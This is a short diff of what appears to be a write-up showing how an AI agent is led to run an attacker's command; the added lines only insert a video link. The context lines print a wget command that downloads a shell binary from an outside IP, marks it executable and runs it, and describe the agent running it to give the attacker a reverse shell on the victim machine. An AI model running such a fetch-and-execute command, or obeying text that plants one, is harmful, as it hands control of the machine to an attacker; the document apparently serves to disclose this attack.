@@ -69,3 +69,8 @@ wget http://139.X.X.27/shell-x86.elf && chmod +x shell-x86.elf && ./shell-x86.el
 The agent will then run the command, and the reverse shell will be created. Now, the attacker can do whatever they want with the victim machine.
 
 Here is a video of the reverse shell being created:
+
+
+
+https://user-images.githubusercontent.com/60182044/221442461-f5ec055c-f4d1-41b5-a0c1-0ce0922b1e94.mp4
+
